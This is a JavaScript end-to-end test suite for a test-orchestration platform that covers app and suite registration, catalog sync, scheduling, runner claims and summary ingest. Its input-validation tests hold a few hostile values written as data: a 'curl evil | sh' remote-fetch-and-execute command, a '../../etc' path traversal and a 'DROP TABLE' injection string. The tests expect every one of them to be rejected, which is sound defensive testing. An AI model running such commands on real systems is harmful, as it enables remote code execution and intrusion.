import assert from 'node:assert/strict'
import test, { after, before } from 'node:test'
import { loadConfig } from '../server/config.mjs'
import { start } from '../server/index.mjs'

// End-to-end over real HTTP against the memory store. This is the P0 exit
// criterion in executable form: register an app, sync a catalog, create a task,
// run it, claim it as a runner, submit a summary, and read the result back.

const ADMIN_TOKEN = 'test-admin-token'
let base
let runtime

const api = async (method, path, { body, token = ADMIN_TOKEN } = {}) => {
  const response = await fetch(`${base}${path}`, {
    method,
    headers: {
      ...(token ? { authorization: `Bearer ${token}` } : {}),
      ...(body ? { 'content-type': 'application/json' } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  })
  const text = await response.text()
  return { status: response.status, body: text ? JSON.parse(text) : null }
}

before(async () => {
  const config = loadConfig({
    MXT_STORE: 'memory',
    MXT_ADMIN_TOKEN: ADMIN_TOKEN,
    MXT_PORT: '0',
    MXT_ARTIFACTS_DIR: '/data/artifacts',
  })
  runtime = await start(config, { schedule: false })
  base = `http://127.0.0.1:${runtime.port}`
})

after(async () => {
  await runtime.close()
})

test('health and readiness need no credentials', async () => {
  assert.equal((await api('GET', '/healthz', { token: null })).status, 200)
  assert.equal((await api('GET', '/readyz', { token: null })).status, 200)
})

test('the control plane rejects a missing or wrong token', async () => {
  assert.equal((await api('GET', '/api/v1/apps', { token: null })).status, 401)
  assert.equal((await api('GET', '/api/v1/apps', { token: 'wrong' })).status, 401)
})

let appSlug = 'compass'
let suiteSlug = 'compass-web-functional'
let taskId

test('registers an application and a suite', async () => {
  const app = await api('POST', '/api/v1/apps', {
    body: {
      slug: appSlug,
      displayName: '罗盘 Compass',
      surfaces: ['web', 'electron'],
      catalogGlob: 'cypress/case-catalog.*.json',
    },
  })
  assert.equal(app.status, 201)
  assert.equal(app.body.app.slug, appSlug)

  const duplicate = await api('POST', '/api/v1/apps', {
    body: { slug: appSlug, displayName: 'again' },
  })
  assert.equal(duplicate.status, 409)

  const suite = await api('POST', `/api/v1/apps/${appSlug}/suites`, {
    body: {
      slug: suiteSlug,
      displayName: 'Web 功能主轨',
      engine: 'cypress',
      surface: 'web',
      runnerKind: 'server',
      command: ['pnpm', 'e2e:run:mock'],
    },
  })
  assert.equal(suite.status, 201)
})

test('imports a schemaVersion 1 catalog unchanged', async () => {
  // Exactly the shape compass already writes, so onboarding it edits nothing.
  const sync = await api('POST', `/api/v1/apps/${appSlug}/catalog:sync`, {
    body: {
      schemaVersion: 1,
      application: 'luopan-po-frontend',
      catalogFile: 'cypress/case-catalog.frontend.json',
      cases: [
        {
          id: 'LP-FE-AUTH-001',
          priority: 'P0',
          spec: 'cypress/e2e/smoke/auth.cy.ts',
          title: '未登录用户访问受保护页面时跳转登录并保留目标地址',
          tags: ['auth', 'route-guard'],
        },
        {
          id: 'LP-FE-AUTH-002',
          priority: 'P0',
          spec: 'cypress/e2e/smoke/auth.cy.ts',
          title: '登录表单阻止空账号、空密码和未完成验证码的提交',
        },
        {
          id: 'LP-FE-NAV-003',
          priority: 'P1',
          spec: 'cypress/e2e/smoke/navigation.cy.ts',
          title: '未知路由展示 404 页面并可返回首页',
        },
      ],
    },
  })
  assert.equal(sync.status, 200)
  assert.deepEqual(sync.body.added.sort(), ['LP-FE-AUTH-001', 'LP-FE-AUTH-002', 'LP-FE-NAV-003'])

  const cases = await api('GET', `/api/v1/apps/${appSlug}/cases`)
  assert.equal(cases.body.cases.length, 3)
  // Defaults filled in for a v1 catalog.
  assert.deepEqual(cases.body.cases[0].tracks, ['functional'])
})

test('rejects a case id that does not match the naming rule', async () => {
  const response = await api('POST', `/api/v1/apps/${appSlug}/catalog:sync`, {
    body: {
      schemaVersion: 2,
      application: appSlug,
      catalogFile: 'bad.json',
      cases: [{ id: 'not-a-case-id', title: 'x' }],
    },
  })
  assert.equal(response.status, 400)
  assert.equal(response.body.error.code, 'invalid_case_id')
  // The message must show the shape it wants, not just say "invalid".
  assert.match(response.body.error.hint, /LP-FE-AUTH-001|序号/)
})

test('removing a case from its catalog retires it instead of deleting it', async () => {
  await api('POST', `/api/v1/apps/${appSlug}/catalog:sync`, {
    body: {
      schemaVersion: 1,
      application: appSlug,
      catalogFile: 'cypress/case-catalog.frontend.json',
      cases: [
        { id: 'LP-FE-AUTH-001', priority: 'P0', title: '保留' },
        { id: 'LP-FE-AUTH-002', priority: 'P0', title: '保留' },
        { id: 'LP-FE-NAV-003', priority: 'P1', title: '保留' },
      ],
    },
  })
  const dropped = await api('POST', `/api/v1/apps/${appSlug}/catalog:sync`, {
    body: {
      schemaVersion: 1,
      application: appSlug,
      catalogFile: 'cypress/case-catalog.frontend.json',
      cases: [{ id: 'LP-FE-AUTH-001', priority: 'P0', title: '保留' }],
    },
  })
  assert.deepEqual(dropped.body.retired.sort(), ['LP-FE-AUTH-002', 'LP-FE-NAV-003'])

  const active = await api('GET', `/api/v1/apps/${appSlug}/cases`)
  assert.equal(active.body.cases.length, 1)
  const all = await api('GET', `/api/v1/apps/${appSlug}/cases?retired=true`)
  assert.equal(all.body.cases.length, 3)

  // Restore the full catalog for the run tests below.
  await api('POST', `/api/v1/apps/${appSlug}/catalog:sync`, {
    body: {
      schemaVersion: 1,
      application: appSlug,
      catalogFile: 'cypress/case-catalog.frontend.json',
      cases: [
        { id: 'LP-FE-AUTH-001', priority: 'P0', title: '未登录跳转登录' },
        { id: 'LP-FE-AUTH-002', priority: 'P0', title: '登录表单校验' },
        { id: 'LP-FE-NAV-003', priority: 'P1', title: '404 页面' },
      ],
    },
  })
})

test('creates a task and validates its schedule', async () => {
  const bad = await api('POST', '/api/v1/tasks', {
    body: {
      app: appSlug,
      suite: suiteSlug,
      name: '坏调度',
      targetUrl: 'https://compass.example.internal',
      schedule: { kind: 'cron', cronExpr: 'not a cron' },
    },
  })
  assert.equal(bad.status, 400)
  assert.equal(bad.body.error.code, 'task_schedule_invalid')

  const credentialUrl = await api('POST', '/api/v1/tasks', {
    body: {
      app: appSlug,
      suite: suiteSlug,
      name: '带凭据的地址',
      targetUrl: 'https://user:pass@compass.example.internal',
    },
  })
  assert.equal(credentialUrl.status, 400)

  const created = await api('POST', '/api/v1/tasks', {
    body: {
      app: appSlug,
      suite: suiteSlug,
      name: 'compass 每晚回归',
      profile: 'mock',
      track: 'functional',
      targetUrl: 'https://compass.example.internal',
      schedule: { kind: 'cron', cronExpr: '0 2 * * *', timezone: 'Asia/Shanghai' },
    },
  })
  assert.equal(created.status, 201)
  assert.ok(created.body.task.nextRunAt, 'a cron task must carry its next fire time')
  taskId = created.body.task.id
})

let runId
let runnerToken

test('runs a task on demand and hands it to a matching runner', async () => {
  const triggered = await api('POST', `/api/v1/tasks/${taskId}:run`)
  assert.equal(triggered.status, 202)
  assert.equal(triggered.body.run.status, 'queued')
  runId = triggered.body.run.id

  const registered = await api('POST', '/runner/v1/runners:register', {
    body: {
      name: 'ci-linux-01',
      kind: 'server',
      os: 'linux',
      engines: ['cypress', 'playwright'],
      surfaces: ['web'],
    },
  })
  assert.equal(registered.status, 201)
  runnerToken = registered.body.token
  assert.ok(runnerToken)
  assert.equal(registered.body.runner.tokenSha256, undefined, 'never echo the stored hash')

  const claimed = await api('POST', '/runner/v1/runs:claim', {
    token: runnerToken,
    body: {},
  })
  assert.equal(claimed.status, 200)
  assert.equal(claimed.body.runId, runId)
  // compass reads E2E_*; the platform speaks both so that repo needs no edits.
  assert.equal(claimed.body.env.E2E_BASE_URL, 'https://compass.example.internal')
  assert.equal(claimed.body.env.MXT_BASE_URL, 'https://compass.example.internal')
  assert.equal(claimed.body.env.E2E_RUN_ID, runId)
  assert.ok(claimed.body.env.MXT_ARTIFACTS_DIR.endsWith(`/runs/${runId}`))
  assert.deepEqual(claimed.body.command, ['pnpm', 'e2e:run:mock'])

  const second = await api('POST', '/runner/v1/runs:claim', { token: runnerToken, body: {} })
  assert.equal(second.status, 204, 'a claimed run must not be handed out twice')
})

test('a runner cannot act on a run it does not hold', async () => {
  const intruder = await api('POST', '/runner/v1/runners:register', {
    body: { name: 'other-box', kind: 'local', os: 'windows', engines: ['playwright'], surfaces: ['electron'] },
  })
  const response = await api('POST', `/runner/v1/runs/${runId}:complete`, {
    token: intruder.body.token,
    body: { exitCode: 0, summary: { schemaVersion: 2, runId, app: appSlug, status: 'passed', totals: { tests: 1 } } },
  })
  assert.equal(response.status, 403)
})

test('ingests a compass-shaped summary and reconciles it with the catalog', async () => {
  const completed = await api('POST', `/runner/v1/runs/${runId}:complete`, {
    token: runnerToken,
    body: {
      exitCode: 0,
      summary: {
        schemaVersion: 1,
        runId,
        profile: 'mock',
        status: 'passed',
        totals: { tests: 2, passed: 2, failed: 0, skipped: 0, durationMs: 4200 },
        specs: [
          {
            name: 'cypress/e2e/smoke/auth.cy.ts',
            tests: [
              { title: '未登录跳转登录', state: 'passed', durationMs: 3120, attempts: 1 },
              { title: '登录表单校验', state: 'passed', durationMs: 1080, attempts: 1 },
            ],
          },
        ],
        functional: {
          catalogTotal: 3,
          cases: [
            { id: 'LP-FE-AUTH-001', status: 'passed', actualTitle: '未登录跳转登录', actualSpec: 'cypress/e2e/smoke/auth.cy.ts' },
            { id: 'LP-FE-AUTH-002', status: 'passed', actualTitle: '登录表单校验', actualSpec: 'cypress/e2e/smoke/auth.cy.ts' },
          ],
          unmapped: [],
        },
      },
    },
  })
  assert.equal(completed.status, 200)
  const run = completed.body.run
  assert.equal(run.status, 'passed')

  // LP-FE-NAV-003 is in the catalog but was never executed. Silently dropping
  // it would let a deleted test look like a clean run.
  assert.equal(run.catalog.counts.notRun, 1)
  assert.equal(run.catalog.counts.passed, 2)
  assert.equal(run.catalog.catalogTotal, 3)
  assert.equal(run.catalog.coverage.catalogPassPercent, 66.67)
  assert.equal(run.catalog.coverage.executedPassPercent, 100)

  const cases = await api('GET', `/api/v1/runs/${runId}/cases`)
  const byId = Object.fromEntries(cases.body.cases.map((entry) => [entry.caseId, entry]))
  assert.equal(byId['LP-FE-AUTH-001'].status, 'passed')
  assert.equal(byId['LP-FE-AUTH-001'].durationMs, 3120)
  assert.equal(byId['LP-FE-NAV-003'].status, 'notRun')
})

test('a run with no executed tests is blocked, never passed', async () => {
  const triggered = await api('POST', `/api/v1/tasks/${taskId}:run`)
  const emptyRunId = triggered.body.run.id
  await api('POST', '/runner/v1/runs:claim', { token: runnerToken, body: {} })

  const completed = await api('POST', `/runner/v1/runs/${emptyRunId}:complete`, {
    token: runnerToken,
    body: {
      exitCode: 2,
      summary: {
        schemaVersion: 2,
        runId: emptyRunId,
        app: appSlug,
        status: 'passed',
        totals: { tests: 0 },
        blockedReason: 'Target unreachable',
      },
    },
  })
  assert.equal(completed.body.run.status, 'blocked')
  assert.equal(completed.body.run.blockedReason, 'Target unreachable')
  // The catalog still reports what did not run.
  assert.equal(completed.body.run.catalog.counts.notRun, 3)
})

test('a non-zero exit code overrides an optimistic summary', async () => {
  const triggered = await api('POST', `/api/v1/tasks/${taskId}:run`)
  const failingRunId = triggered.body.run.id
  await api('POST', '/runner/v1/runs:claim', { token: runnerToken, body: {} })

  const completed = await api('POST', `/runner/v1/runs/${failingRunId}:complete`, {
    token: runnerToken,
    body: {
      exitCode: 1,
      summary: {
        schemaVersion: 2,
        runId: failingRunId,
        app: appSlug,
        status: 'passed',
        totals: { tests: 1, passed: 1 },
        cases: [{ caseId: 'LP-FE-AUTH-001', status: 'passed' }],
      },
    },
  })
  assert.equal(completed.body.run.status, 'failed')
})

test('records step offsets so a report can jump into the recording', async () => {
  const triggered = await api('POST', `/api/v1/tasks/${taskId}:run`)
  const stepRunId = triggered.body.run.id
  await api('POST', '/runner/v1/runs:claim', { token: runnerToken, body: {} })
  await api('POST', `/runner/v1/runs/${stepRunId}:complete`, {
    token: runnerToken,
    body: {
      exitCode: 0,
      summary: {
        schemaVersion: 2,
        runId: stepRunId,
        app: appSlug,
        status: 'passed',
        totals: { tests: 1, passed: 1 },
        cases: [
          {
            caseId: 'LP-FE-AUTH-001',
            status: 'passed',
            steps: [
              { seq: 1, label: '打开受保护页面', status: 'passed', offsetMs: 120 },
              { seq: 2, label: '确认跳转到登录页', status: 'passed', offsetMs: 2400 },
            ],
            artifacts: [{ kind: 'video', path: 'videos/smoke/auth.cy.ts.mp4' }],
          },
        ],
      },
    },
  })
  const steps = await api('GET', `/api/v1/runs/${stepRunId}/cases/LP-FE-AUTH-001/steps`)
  assert.equal(steps.body.steps.length, 2)
  assert.equal(steps.body.steps[1].offsetMs, 2400)
})

test('an Electron suite is never handed to a Linux container', async () => {
  await api('POST', `/api/v1/apps/${appSlug}/suites`, {
    body: {
      slug: 'compass-electron',
      displayName: '桌面端',
      engine: 'playwright-electron',
      surface: 'electron',
      runnerKind: 'local',
      requirements: { os: ['windows', 'macos'] },
    },
  })
  const task = await api('POST', '/api/v1/tasks', {
    body: { app: appSlug, suite: 'compass-electron', name: '桌面冒烟', claimWindowMinutes: 60 },
  })
  const triggered = await api('POST', `/api/v1/tasks/${task.body.task.id}:run`)
  // Local-runner work waits for a machine rather than queueing for the cluster.
  assert.equal(triggered.body.run.status, 'pending-runner')

  const wrongRunner = await api('POST', '/runner/v1/runs:claim', { token: runnerToken, body: {} })
  assert.equal(wrongRunner.status, 204)

  const desktop = await api('POST', '/runner/v1/runners:register', {
    body: {
      name: 'wang-windows',
      kind: 'local',
      os: 'windows',
      engines: ['playwright-electron'],
      surfaces: ['electron'],
    },
  })
  const claimed = await api('POST', '/runner/v1/runs:claim', {
    token: desktop.body.token,
    body: {},
  })
  assert.equal(claimed.status, 200)
  assert.equal(claimed.body.runId, triggered.body.run.id)
})

test('an unknown runner token is rejected', async () => {
  const response = await api('POST', '/runner/v1/runs:claim', { token: 'mxt-rnr-bogus', body: {} })
  assert.equal(response.status, 401)
})

test('a run is measured against its own suite, not the whole application', async () => {
  // 罗盘 has three suites. Before this was scoped, an Electron run reported all
  // 23 web cases as `notRun` — true in the narrowest sense, and enough to make
  // the signal worthless for any app with more than one suite.
  const app = await api('POST', '/api/v1/apps', {
    body: { slug: 'twosuite', displayName: 'Two Suites', surfaces: ['web', 'electron'] },
  })
  assert.equal(app.status, 201, JSON.stringify(app.body))

  for (const [slug, surface, engine] of [
    ['web', 'web', 'cypress'],
    ['desktop', 'electron', 'playwright-electron'],
  ]) {
    await api('POST', '/api/v1/apps/twosuite/suites', {
      body: {
        slug,
        displayName: slug,
        engine,
        surface,
        runnerKind: 'local',
        targetMode: 'self',
        command: ['pnpm', 'e2e'],
      },
    })
  }
  await api('POST', '/api/v1/apps/twosuite/catalog:sync', {
    body: {
      schemaVersion: 2,
      catalogFile: 'web.json',
      suite: 'web',
      cases: [
        { id: 'TS-FE-A-001', title: 'web one' },
        { id: 'TS-FE-A-002', title: 'web two' },
      ],
    },
  })
  await api('POST', '/api/v1/apps/twosuite/catalog:sync', {
    body: {
      schemaVersion: 2,
      catalogFile: 'desktop.json',
      suite: 'desktop',
      cases: [{ id: 'TS-EL-A-001', title: 'desktop one' }],
    },
  })

  const task = await api('POST', '/api/v1/tasks', {
    body: {
      app: 'twosuite',
      suite: 'desktop',
      name: 'desktop-run',
      profile: 'mock',
      track: 'functional',
    },
  })
  const run = await api('POST', `/api/v1/tasks/${task.body.task.id}:run`, { body: {} })
  const runner = await api('POST', '/runner/v1/runners:register', {
    body: {
      name: 'box',
      os: 'windows',
      engines: ['playwright-electron'],
      surfaces: ['electron'],
    },
  })
  const claimed = await api('POST', '/runner/v1/runs:claim', { token: runner.body.token })
  const result = await api('POST', `/runner/v1/runs/${claimed.body.runId}:complete`, {
    token: claimed.body.runToken,
    body: {
      exitCode: 0,
      summary: {
        schemaVersion: 2,
        totals: { tests: 1, passed: 1 },
        cases: [{ caseId: 'TS-EL-A-001', status: 'passed' }],
      },
    },
  })

  assert.equal(result.body.run.status, 'passed')
  // Only the desktop suite's single case is in scope.
  assert.equal(result.body.run.catalog.catalogTotal, 1)
  assert.equal(result.body.run.catalog.counts.notRun, 0)
  assert.equal(result.body.run.totals.notRun, 0)
  void run
})

test('E2E_ARTIFACTS_DIR is the root, not the run directory', async () => {
  // compass's scripts/e2e-runtime.mjs treats it as a root and writes to
  // `<root>/<E2E_RUN_ID>`. Setting it to the run directory made the suite write
  // to `.../<runId>/<runId>`, where the platform found no summary.json and
  // reported a run that had actually passed as blocked.
  const { runnerEnv } = await import('../server/app.mjs')
  const env = runnerEnv({
    run: { id: 'trun_1', track: 'functional', profile: 'mock' },
    suite: { slug: 'web' },
    app: { slug: 'luopan' },
    config: { artifactsDir: '/data/artifacts' },
  })
  assert.equal(env.MXT_ARTIFACTS_DIR, '/data/artifacts/runs/trun_1')
  assert.equal(env.E2E_ARTIFACTS_DIR, '/data/artifacts/runs')
  // The suite joins them back together and lands exactly on the run directory.
  assert.equal(`${env.E2E_ARTIFACTS_DIR}/${env.E2E_RUN_ID}`, env.MXT_ARTIFACTS_DIR)
})

test('the commit the runner actually checked out is recorded', async () => {
  // doc 14 §2 called out `source_ref` as declared-but-never-written and fixed
  // the runner half: it reads the sha back with `git rev-parse HEAD`. The
  // ingest half was still dropping it, so the column stayed empty and
  // "which commit was that failure on" remained unanswerable.
  const app = await api('POST', '/api/v1/apps', {
    body: { slug: 'sha-app', displayName: 'sha', surfaces: ['web'] },
  })
  assert.equal(app.status, 201, JSON.stringify(app.body))
  await api('POST', '/api/v1/apps/sha-app/suites', {
    body: {
      slug: 'web',
      displayName: 'web',
      engine: 'cypress',
      surface: 'web',
      runnerKind: 'local',
      targetMode: 'self',
      command: ['pnpm', 'e2e'],
    },
  })
  const task = await api('POST', '/api/v1/tasks', {
    body: { app: 'sha-app', suite: 'web', name: 'sha-run', profile: 'mock', track: 'functional' },
  })
  await api('POST', `/api/v1/tasks/${task.body.task.id}:run`, { body: {} })
  const runner = await api('POST', '/runner/v1/runners:register', {
    body: { name: 'sha-box', os: 'linux', engines: ['cypress'], surfaces: ['web'] },
  })
  const claimed = await api('POST', '/runner/v1/runs:claim', { token: runner.body.token })

  const result = await api('POST', `/runner/v1/runs/${claimed.body.runId}:complete`, {
    token: claimed.body.runToken,
    body: {
      exitCode: 0,
      summary: {
        schemaVersion: 2,
        totals: { tests: 1, passed: 1 },
        cases: [{ caseId: 'SHA-A-001', status: 'passed' }],
        sourceRef: { ref: 'public', gitSha: 'ABCDEF1234567890abcdef1234567890ABCDEF12' },
      },
    },
  })
  assert.equal(result.body.run.sourceRef.gitSha, 'abcdef1234567890abcdef1234567890abcdef12')
  assert.equal(result.body.run.sourceRef.ref, 'public')
})

test('a sha that is not a sha is discarded rather than stored', async () => {
  // The runner is not a trusted source; a value that cannot be a commit is
  // worse than no value, because it looks like provenance.
  const { normalizeSummary } = await import('../server/ingest/summary.mjs')
  const base = { schemaVersion: 2, totals: { tests: 1, passed: 1 }, cases: [] }
  assert.equal(
    normalizeSummary({ ...base, sourceRef: { gitSha: 'not-a-sha; DROP TABLE' } }, 0).sourceRef,
    null,
  )
  assert.equal(normalizeSummary({ ...base, sourceRef: 'main' }, 0).sourceRef, null)
  assert.equal(normalizeSummary(base, 0).sourceRef, null)
})

test('套件登记错了可以改，且改不出创建时不允许的东西', async () => {
  await api('POST', '/api/v1/apps', {
    body: { slug: 'patchable', displayName: 'Patchable', surfaces: ['electron'] },
  })
  const created = await api('POST', '/api/v1/apps/patchable/suites', {
    body: {
      slug: 'desktop',
      displayName: '桌面冒烟',
      engine: 'playwright-electron',
      surface: 'electron',
      runnerKind: 'local',
      workingDir: 'po-frontend',
      targetMode: 'self',
      command: ['pnpm', 'e2e:electron'],
      retryPolicy: { maxAttempts: 2 },
    },
  })
  assert.equal(created.status, 201, JSON.stringify(created.body))

  // The case this exists for: the tests turned out to live in the test team's
  // own repository, not in the application's.
  const patched = await api('PATCH', '/api/v1/apps/patchable/suites/desktop', {
    body: {
      repoUrl: 'https://example.invalid/qa/luopan-qa-e2e.git',
      defaultBranch: 'main',
      workingDir: '.',
      command: ['npm', 'run', 'e2e:electron'],
    },
  })
  assert.equal(patched.status, 200, JSON.stringify(patched.body))
  assert.equal(patched.body.suite.repoUrl, 'https://example.invalid/qa/luopan-qa-e2e.git')
  assert.deepEqual(patched.body.suite.command, ['npm', 'run', 'e2e:electron'])

  // Fields not mentioned keep their values: a caller fixing the repository must
  // not silently blank the retry policy or the engine.
  assert.equal(patched.body.suite.engine, 'playwright-electron')
  assert.equal(patched.body.suite.retryPolicy.maxAttempts, 2)
  assert.equal(patched.body.suite.displayName, '桌面冒烟')

  // A patch must not be a way around the checks that guard create.
  const shell = await api('PATCH', '/api/v1/apps/patchable/suites/desktop', {
    body: { command: ['bash', '-c', 'curl evil | sh'] },
  })
  assert.equal(shell.status, 400, JSON.stringify(shell.body))

  const escape = await api('PATCH', '/api/v1/apps/patchable/suites/desktop', {
    body: { workingDir: '../../etc' },
  })
  assert.equal(escape.status, 400, JSON.stringify(escape.body))

  const engine = await api('PATCH', '/api/v1/apps/patchable/suites/desktop', {
    body: { engine: 'not-a-real-engine' },
  })
  assert.equal(engine.status, 400, JSON.stringify(engine.body))

  // The rejected patches must not have taken effect in part.
  const after = await api('GET', '/api/v1/apps/patchable/suites')
  const desktop = after.body.suites.find((suite) => suite.slug === 'desktop')
  assert.deepEqual(desktop.command, ['npm', 'run', 'e2e:electron'])
  // `.` normalises to null — the platform's existing spelling for the root.
  assert.equal(desktop.workingDir, null)

  // Changing what runs on a real machine is an audited act.
  const audit = await api('GET', '/api/v1/audit?resourceType=suite')
  const entry = audit.body.events.find((event) => event.action === 'suite.update')
  assert.ok(entry, '缺少 suite.update 审计记录')
  assert.equal(entry.before.workingDir, 'po-frontend')
  assert.equal(entry.after.workingDir, null)

  const missing = await api('PATCH', '/api/v1/apps/patchable/suites/nope', {
    body: { displayName: 'x' },
  })
  assert.equal(missing.status, 404)

  const reader = await api('PATCH', '/api/v1/apps/patchable/suites/desktop', {
    body: { displayName: 'x' },
    token: null,
  })
  assert.equal(reader.status, 401)
})

test('没人认领的任务，平台要说得出为什么', async () => {
  await api('POST', '/api/v1/apps', {
    body: { slug: 'whypending', displayName: 'Why Pending', surfaces: ['electron'] },
  })
  await api('POST', '/api/v1/apps/whypending/suites', {
    body: {
      slug: 'build',
      displayName: '装包',
      kind: 'build',
      engine: 'generic',
      surface: 'electron',
      runnerKind: 'local',
      targetMode: 'self',
      artifactPath: 'dist/*.exe',
      command: ['pnpm', 'build'],
      requirements: { os: ['windows'] },
    },
  })
  const task = await api('POST', '/api/v1/tasks', {
    body: {
      app: 'whypending',
      suite: 'build',
      name: '装包 · 手动',
      profile: 'mock',
      track: 'functional',
      schedule: { kind: 'manual' },
    },
  })
  const queued = await api('POST', `/api/v1/tasks/${task.body.task.id}:run`, { body: {} })
  const runId = queued.body.run.id

  // Nothing registered here can build: the answer must name the capability,
  // not just repeat the status.
  let detail = await api('GET', `/api/v1/runs/${runId}`)
  assert.equal(detail.body.run.status, 'pending-runner')
  assert.deepEqual(detail.body.pending.eligibleRunners, [])
  assert.match(detail.body.pending.message, /引擎 generic/u)

  // A runner that cannot do this work: name the capability it is missing,
  // which is the whole point — `generic` was the answer the first time and it
  // took reading a SQL predicate to find it.
  const registered = await api('POST', '/runner/v1/runners:register', {
    body: {
      name: 'mac-mini',
      kind: 'local',
      os: 'macos',
      arch: 'arm64',
      engines: ['playwright'],
      surfaces: ['web'],
    },
  })
  assert.equal(registered.status, 201, JSON.stringify(registered.body))

  detail = await api('GET', `/api/v1/runs/${runId}`)
  assert.deepEqual(detail.body.pending.eligibleRunners, [])
  const rejected = detail.body.pending.rejected.find((entry) => entry.runner === 'mac-mini')
  assert.ok(rejected, JSON.stringify(detail.body.pending))
  assert.ok(rejected.missing.some((text) => text.includes('generic')), rejected.missing.join('|'))
  assert.ok(rejected.missing.some((text) => text.includes('electron')), rejected.missing.join('|'))
  assert.ok(rejected.missing.some((text) => text.includes('windows')), rejected.missing.join('|'))

  // A runner that can: stop blaming capabilities and point at the real cause.
  await api('POST', '/runner/v1/runners:register', {
    body: {
      name: 'win-box',
      kind: 'local',
      os: 'windows',
      arch: 'x64',
      engines: ['generic'],
      surfaces: ['electron'],
    },
  })
  detail = await api('GET', `/api/v1/runs/${runId}`)
  assert.ok(detail.body.pending.eligibleRunners.includes('win-box'),
    JSON.stringify(detail.body.pending))
  assert.match(detail.body.pending.message, /mxt-runner watch/u)
})

test('用 JUnit 上报的套件，commit 一样要记下来', async () => {
  // The third place this field went missing. Suites that write summary.json
  // carried it; suites that report JUnit — which is every framework the
  // platform did not invent — had no summary for it to ride in, so the sha the
  // runner had already computed was dropped on the floor.
  const gitSha = '9656432f214b7a0d1c5e2f3a4b6c8d9e0f1a2b3c'
  await api('POST', '/api/v1/apps', {
    body: {
      slug: 'junitref',
      displayName: 'JUnit Ref',
      surfaces: ['electron'],
      repoUrl: 'https://example.invalid/qa/tests.git',
      defaultBranch: 'main',
    },
  })
  await api('POST', '/api/v1/apps/junitref/suites', {
    body: {
      slug: 'desktop',
      displayName: '桌面冒烟',
      engine: 'playwright-electron',
      surface: 'electron',
      runnerKind: 'local',
      targetMode: 'self',
      command: ['npm', 'run', 'e2e:electron'],
    },
  })
  const task = await api('POST', '/api/v1/tasks', {
    body: {
      app: 'junitref',
      suite: 'desktop',
      name: '桌面 · 手动',
      profile: 'mock',
      track: 'functional',
      schedule: { kind: 'manual' },
    },
  })
  const queued = await api('POST', `/api/v1/tasks/${task.body.task.id}:run`, { body: {} })
  const id = queued.body.run.id

  const runner = await api('POST', '/runner/v1/runners:register', {
    body: {
      name: 'junit-box',
      kind: 'local',
      os: 'windows',
      engines: ['playwright-electron'],
      surfaces: ['electron'],
    },
  })
  const claimed = await api('POST', '/runner/v1/runs:claim', { token: runner.body.token })
  assert.equal(claimed.body.runId, id)

  const completed = await api('POST', `/runner/v1/runs/${id}:complete`, {
    token: claimed.body.runToken,
    body: {
      exitCode: 0,
      sourceRef: { ref: 'main', gitSha },
      junit: [
        `<testsuites><testsuite name="boot" tests="1" failures="0">
           <testcase name="LP-EL-BOOT-001 打包应用能冷启动并拿到主窗口" time="2.2"/>
         </testsuite></testsuites>`,
      ],
    },
  })
  assert.equal(completed.body.run.status, 'passed', JSON.stringify(completed.body))
  assert.equal(completed.body.run.sourceRef.gitSha, gitSha, '上周三那次失败在哪个 commit，要答得出来')
  assert.equal(completed.body.run.sourceRef.ref, 'main')
})
